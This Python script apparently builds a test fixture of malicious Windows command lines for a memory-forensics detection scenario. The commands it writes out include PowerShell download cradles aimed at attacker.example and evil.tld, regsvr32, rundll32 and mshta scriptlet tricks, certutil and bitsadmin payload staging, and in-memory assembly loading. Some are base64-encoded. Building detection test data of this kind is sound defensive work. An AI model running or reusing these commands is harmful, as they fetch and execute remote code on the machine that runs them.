"""Generate windows_cmdline.json fixture with T1140 malicious cmdlines.

Takes the MALICIOUS corpus from realworld_cmdlines.py and generates a
Volatility-shaped JSON fixture for scenario 12_memory_intrusion.
"""

from __future__ import annotations

import base64
import json
from pathlib import Path


def ps_encode(s: str) -> str:
    """Mimic PowerShell -EncodedCommand: UTF-16LE + base64."""
    return base64.b64encode(s.encode("utf-16-le")).decode("ascii")


MALICIOUS_CMDLINES = [
    # Original fixture entry (T1059 - hidden PowerShell)
    {
        "PID": 5580,
        "Process": "powershell.exe",
        "Args": "powershell.exe -WindowStyle Hidden -NoProfile -Command Get-ADUser",
    },
    # T1140 - Deobfuscate/Decode Files or Information
    # Classic download cradle via -EncodedCommand
    {
        "PID": 6001,
        "Process": "powershell.exe",
        "Args": f"powershell.exe -EncodedCommand {ps_encode('IEX (New-Object Net.WebClient).DownloadString(\"http://attacker.example/a.ps1\")')}",
    },
    # -enc short alias
    {
        "PID": 6002,
        "Process": "pwsh.exe",
        "Args": f"pwsh -enc {ps_encode('Invoke-WebRequest http://evil.tld/x -OutFile $env:TEMP\\\\x.exe; Start-Process $env:TEMP\\\\x.exe')}",
    },
    # squiblydoo (rundll32 + javascript:)
    {
        "PID": 6003,
        "Process": "rundll32.exe",
        "Args": r'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("calc.exe")',
    },
    # squiblytwo (regsvr32 + scrobj.dll remote)
    {
        "PID": 6004,
        "Process": "regsvr32.exe",
        "Args": r"regsvr32.exe /s /n /u /i:http://attacker.example/file.sct scrobj.dll",
    },
    # mshta remote HTTP
    {
        "PID": 6005,
        "Process": "mshta.exe",
        "Args": r"mshta.exe http://attacker.example/payload.hta",
    },
    # mshta vbscript: protocol
    {
        "PID": 6006,
        "Process": "mshta.exe",
        "Args": r'mshta.exe vbscript:CreateObject("Wscript.Shell").Run("calc.exe")(window.close)',
    },
    # certutil -decode (T1140 canonical)
    {
        "PID": 6007,
        "Process": "certutil.exe",
        "Args": r"certutil -decode C:\Users\Public\payload.b64 C:\Users\Public\payload.exe",
    },
    # bitsadmin /transfer (T1197 - BITS Jobs)
    {
        "PID": 6008,
        "Process": "bitsadmin.exe",
        "Args": r"bitsadmin /transfer download /priority high http://attacker.example/x.exe C:\Users\Public\x.exe",
    },
    # Plaintext IEX + WebClient
    {
        "PID": 6009,
        "Process": "powershell.exe",
        "Args": r'powershell -NoP -W Hidden "IEX (New-Object Net.WebClient).DownloadString(\"http://attacker.example/p.ps1\")"',
    },
    # -EncodedCommand wrapping Reflection.Assembly (in-memory PE load)
    {
        "PID": 6010,
        "Process": "powershell.exe",
        "Args": f"powershell -EncodedCommand {ps_encode('[Reflection.Assembly]::Load([Convert]::FromBase64String($payload)).EntryPoint.Invoke($null,$null)')}",
    },
]


def main() -> None:
    output_path = (
        Path(__file__).parent.parent.parent
        / "scenarios"
        / "synthetic"
        / "12_memory_intrusion"
        / "memory_fixtures"
        / "windows_cmdline.json"
    )

    with output_path.open("w") as f:
        json.dump(MALICIOUS_CMDLINES, f, indent=2)
        f.write("\n")

    print(f"Wrote {len(MALICIOUS_CMDLINES)} cmdline entries to {output_path}")
    print("\nExpected finding count delta:")
    print("  Original: 1 cmdline finding (PID 5580)")
    print(f"  New: {len(MALICIOUS_CMDLINES)} cmdline findings (PIDs 5580, 6001-6010)")
    print(f"  Delta: +{len(MALICIOUS_CMDLINES) - 1} findings")
    print("\nScenario expectation update required:")
    print("  finding_counts.memory_finding: 7 -> 16")
    print("  finding_counts.total: 7 -> 16")


if __name__ == "__main__":
    main()
